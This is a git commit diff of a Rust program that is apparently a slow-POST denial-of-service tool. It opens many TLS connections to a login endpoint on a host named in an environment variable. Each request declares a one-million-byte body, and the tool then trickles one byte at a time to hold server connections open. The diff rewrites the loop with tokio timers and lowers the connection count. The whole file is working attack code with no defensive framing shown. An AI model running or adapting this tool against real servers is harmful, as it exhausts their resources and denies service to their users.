f54f73e36864db6ee22f1fe4a0f7de540df201b7
Andrey Voronkov <andrey.voronkov@medm.com>
2017-05-17 18:28:38 +0300

    Somewhere in a middle of nowhere.

--- src/main.rs
+++ src/main.rs
@@ -1,38 +1,40 @@
+extern crate futures;
 extern crate native_tls;
+
+extern crate tokio_core;
+extern crate tokio_timer;
+
 use native_tls::TlsConnector;
 use std::env;
 use std::io::Write;
 use std::net::TcpStream;
-use std::thread;
 use std::time::Duration;
-use std::sync::{Arc, Mutex};
+
+use futures::*;
+use tokio_timer::*;
+use tokio_core::reactor::{ Core, Interval };
 
 fn main() {
     let host = env::var("HOST").unwrap();
     let port = "443";
-    let connections_count = 2048;
+    let timeout = 1;
+    let connections_count = 20;
 
-    let true_streams = Arc::new(Mutex::new(Vec::with_capacity(connections_count)));
-    let streams = true_streams.to_owned();
-    let connections_producer = thread::spawn(move || {
-        let start = format!("POST /api/v3/user/login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: 1000000\r\n\r\nemail=", host);
-        for _ in 0..connections_count {
-            thread::sleep(Duration::from_millis(500));
-            let connector = TlsConnector::builder().unwrap().build().unwrap();
-            let stream = TcpStream::connect(format!("{}:{}", host, port)).unwrap();
-            let mut stream = connector.connect(&host, stream).unwrap();
-            let _  = stream.write(start.as_bytes());
-            streams.lock().unwrap().push(stream);
-        }
-    });
+    let mut core = Core::new().unwrap();
+    let handle = core.handle();
+    for index in 0..connections_count {
+        let start = format!("POST /api/v3/user/login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: 1000000\r\n\r\n", host);
+        let connector = TlsConnector::builder().unwrap().build().unwrap();
+        let stream = TcpStream::connect(format!("{}:{}", host, port)).unwrap();
+        let mut stream = connector.connect(&host, stream).unwrap();
+        stream.write(start.as_bytes());
 
-    let streams = true_streams.to_owned();
-    loop {
-        thread::sleep(Duration::from_millis(10));
-        for (index, stream) in streams.lock().unwrap().iter_mut().enumerate() {
+        let timer = Timer::default().interval(Duration::from_secs(timeout)).for_each(move |_| {
             stream.write(b"a");
             stream.flush();
-            println!("Stream number: {} written.", index)
-        }
+            println!("Stream number: {} written.", index);
+            Ok(())
+        });
+        handle.spawn(timer.map_err(|_| ()));
     }
 }
